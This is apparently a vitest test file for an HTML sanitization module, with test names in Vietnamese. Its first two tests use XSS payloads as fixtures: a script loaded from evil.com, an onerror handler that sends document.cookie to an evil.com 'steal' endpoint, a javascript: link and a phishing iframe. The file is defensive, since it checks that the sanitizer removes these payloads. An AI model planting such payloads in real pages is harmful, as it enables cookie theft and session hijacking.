// tests/sanitize.test.ts
import { describe, it, expect } from 'vitest';
import { sanitizeHtmlContent, escapeHtml, stripHtmlToPlainText } from '../src/security/sanitize.js';

describe('Anti-XSS Sanitization', () => {
  it('11. Loại bỏ các thẻ script và mã JavaScript nguy hại', () => {
    const maliciousHtml = `
      <p>Bản tin bình thường</p>
      <script>alert('XSS Attack');</script>
      <script src="https://evil.com/malware.js"></script>
    `;

    const clean = sanitizeHtmlContent(maliciousHtml);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('alert');
    expect(clean).toContain('<p>Bản tin bình thường</p>');
  });

  it('Loại bỏ iframe, object, embed và event handlers (onerror, onclick)', () => {
    const malicious = `
      <h3>Tiêu đề an toàn</h3>
      <img src="invalid-image" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)" />
      <a href="javascript:alert(1)" onclick="steal()">Click me</a>
      <iframe src="https://evil.com/phishing"></iframe>
    `;

    const clean = sanitizeHtmlContent(malicious);
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('iframe');
    expect(clean).not.toContain('javascript:');
    expect(clean).toContain('<h3>Tiêu đề an toàn</h3>');
  });

  it('Bảo toàn định dạng văn bản hợp lệ (p, h3, ul, li, strong, em)', () => {
    const safeInput = `
      <p>Đoạn văn có <strong>chữ in đậm</strong> và <em>in nghiêng</em>.</p>
      <h3>Tiêu đề mục nhỏ</h3>
      <ul>
        <li>Điểm thứ nhất</li>
        <li>Điểm thứ hai</li>
      </ul>
    `;
    const output = sanitizeHtmlContent(safeInput);
    expect(output).toContain('<p>Đoạn văn có <strong>chữ in đậm</strong>');
    expect(output).toContain('<h3>Tiêu đề mục nhỏ</h3>');
    expect(output).toContain('<li>Điểm thứ nhất</li>');
  });

  it('escapeHtml mã hóa các ký tự đặc biệt', () => {
    const raw = `<script>alert("hello & welcome 'world'");</script>`;
    const escaped = escapeHtml(raw);
    expect(escaped).toBe('&lt;script&gt;alert(&quot;hello &amp; welcome &#39;world&#39;&quot;);&lt;/script&gt;');
  });

  it('stripHtmlToPlainText chuyển HTML thành văn bản thuần', () => {
    const html = '<p>Đoạn <strong>văn bản</strong> <a href="#">liên kết</a>.</p>';
    expect(stripHtmlToPlainText(html)).toBe('Đoạn văn bản liên kết .');
  });
});
